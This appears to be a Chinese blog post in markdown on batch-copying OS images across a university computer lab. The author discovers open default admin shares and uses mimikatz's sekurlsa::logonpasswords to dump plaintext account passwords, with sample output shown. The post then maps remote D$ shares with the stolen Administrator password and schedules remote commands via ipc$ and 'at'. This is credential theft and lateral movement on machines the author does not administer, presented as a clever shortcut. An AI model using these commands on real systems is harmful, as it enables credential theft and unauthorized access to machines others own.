@@ -1,0 +1,181 @@
+title: 批处理实现机房文件批量传输
+date: 2015-10-17
+tags: [cmd,bat,网络共享]
+categories: cmd
+---
+题记：计算机维护队将于次日在机房进行队员第一次培训会，培训会上的队员实操过程则需要使用到win7和PE镜像，工作人员（委员）不得不提前拷贝好镜像到每一台机子。于是便有了机房内通过网络批量传输文件的想法，实现之后可以大大减轻工作量，传输速度上瓶颈为100Mbps（机房网络配置），与普通USB3.0的U盘传输速率相比确实低了一大截，在传输速率上似乎不占优势，因此我们将多台主机作为源点传输数据，并行传输数据，大大提升了时间效率。
+
+![mimikatz](/img/jiwei/logo.jpg)
+
+### 机遇阶段
+很凑巧，在同类型的机房中上实验课的时候一不小心执行了以下powershell指令：
+
+```Bash
+Get-WmiObject -Class Win32_Share -Computername [computername]
+# [computername] 代表主机名
+```
+
+意外的收获，默认共享居然没有被关闭，切安全策略~[偷笑]!
+
+```Bash
+Name     Path                          Description
+----     ----                          -----------
+ADMIN$   C:\Windows                    远程管理
+C$       C:\                           默认共享
+D$       D:\                           默认共享
+IPC$                                   远程 IPC
+```
+
+然而不出所料，我尝试通过net use空连接到旁边的机子时，被无情的拒之门外。要知道机房的电脑都是自带默认密码的。
+
+```Bash
+net use z: \\[computername]\D$
+
+为 '[computername]' 输入用户名:
+发生系统错误 1223。
+操作已被用户取消。
+```
+
+好吧，确实是个棘手的问题，因为不可能提前手动更改用户密码，因为机房的电脑自带还原程序（且不可恶意破坏），因此不得不废弃这个方案。于是编者剑走偏锋，掏出了一代神器[mimikatz_trunk](http://blog.gentilkiwi.com/presentations)，利用这个神器可以轻易获取windows系统账户的明文密码。
+
+#### 下载链接
+* [Binaires](https://github.com/gentilkiwi/mimikatz/releases/latest)
++ [Sources](https://github.com/gentilkiwi/mimikatz)
+
+使用说明详参[README.md](https://github.com/gentilkiwi/mimikatz/blob/master/README.md)，下载后或编译后程序目录如下：
+
+![mimikatz](/img/jiwei/mimikatz.png)
+
+我们接着运行如下命令即可获得账户明文密码：
+
+```
+# 提升权限
+mimikatz # privilege::debug
+Privilege '20' OK
+
+# 获取密码
+mimikatz # sekurlsa::logonpasswords
+
+```
+
+获取密码后部分结果如下：
+
+```Bash
+# *是编者自己打上的马赛克，命令执行后输出的全为明文，下同
+Authentication Id : 0 ; 298372 (00000000:00048d84)
+Session           : Interactive from 1
+User Name         : ******
+Domain            : ****
+Logon Server      : (null)
+Logon Time        : 2015-10-16 20:54:11
+SID               : S-1-5-21-*******-********-*********-1004
+        msv :
+         [00000003] Primary
+         * Username : ******@outlook.com
+         * Domain   : MicrosoftAccount
+         * Flags    : I00/N01/L00/S01
+         * NTLM     : 198469ad0**********ed7ddfadd94
+         * SHA1     : 1018ac5781ab260******8b9d57fae11d3313a86
+        tspkg :
+         * Username : ******@outlook.com
+         * Domain   : MicrosoftAccount
+         * Password : ********
+        wdigest :
+         * Username : ******@outlook.com
+         * Domain   : MicrosoftAccount
+         * Password : ******
+        kerberos :
+         * Username : ******@outlook.com
+         * Domain   : MicrosoftAccount
+         * Password : (null)
+        ssp :
+        credman :
+         [00000000]
+         * Username : (null)
+         * Domain   : MicrosoftOffice16_Data:SSPI:lxstart@outlook.com
+         * Password : ******
+    
+```
+### 程序设计
+既然获取到了一台机子的明文密码（账户名默认为Administrator），由于机房采用统一镜像进行安装，因此默认账户信息完全一致，那么，就可以跳到批量传输的阶段了。那么我们来做一个详尽的规划：[篇幅有限，下面只提供关键代码]
+
+#### 获取局域网内的主机名列表
+
+原理：通过net view获取局域网主机列表后进行字符串过滤筛选，得到最终的主机名列表并写入hosts.ini文件。
+
+```Bash
+(for /f "eol=。 skip=3 tokens=1 delims=, " %%i in ('net view') do (
+	for /f "tokens=1 delims=\ " %%a in ('echo %%i ^| findstr ^\') do (
+		echo %%a
+	)
+)) >> hosts.ini
+```
+
+#### 建立net use连接
+
+```Bash
+# 将网络路径\\[hostname]\d$映射到z:\
+net use z: \\[hostname]\d$ "******" /user:"administrator" /persistent:yes
+```
+
+在这之前需要先释放z:原本可能存在net use连接：
+
+```Bash
+net use z: /delete
+```
+我们就可以直接通过访问z:来访问到目标机器的D盘根目录并进行文件操作了。
+
+#### 复制文件
+推荐使用xcopy命令，参数较简单易懂。
+
+```Bash
+# 假设D:\已有win7.iso和PE.iso
+xcopy D:\win7.iso Z:\
+xcopy D:\PE.iso Z:\
+```
+#### 批量复制
+由于我们已经获取到主机名列表，则我们可以串行批量复制文件。
+
+```Bash
+for /f  %%a in (hosts.ini) do (
+	echo 正在处理%%a
+	call :copyer %%a
+	:: 删除映射，释放连接
+	net use z: /delete /y
+)
+
+# 定义函数
+:copyer
+net use z: \\%~1\d$ "******" /user:"administrator" /persistent:yes
+xcopy D:\win7.iso Z:\
+xcopy D:\PE.iso Z:\
+```
+#### 多主机并行处理
+将程序放置到多台主机下运行，划分主机名列表片段到不同的主机，则可同时执行不同的文件批量复制的任务。
+
+#### 最佳方案
+这里涉及一种类似于细胞分裂的算法技术，在上面原有的基础上添加更能提高效率的解决方案。假设每人负责部署一台主机（用于批量复制文件），复制完46台机子需要(46-6)/6=7轮，开始说表述的每台机子带宽有限（下面的流程图则以一台源主机为例解释），因此传输速度也难以提升。
+
+更合理的解决方案就是利用所有空闲切有镜像的主机的网络带宽，思路图对比大致如下：
+
+* 传统
+![mimikatz](/img/jiwei/文件复制分裂.png)
+
+* 变种
+![mimikatz](/img/jiwei/文件复制并行.png)
+
+关键要解决的问题是需要给下一台机器发送指令，分配给每台主机最优的复制队列：通过ipc$获取远程at和time权限
+
+```Bash
+# 建立ipc$连接
+net use \\[hostname]\ipc$ "password" /user:"username"
+
+# 获取主机时间，假设为19:00
+net time \\[hostname]
+
+# at 设置命令，假设transformListFile.bat包含了计算下一台机子需要复制到的目标队列的算法
+at \\[hostname] 19:01 transformListFile.bat
+
+```
+
+具体求法下回分解。夜深人悄悄。
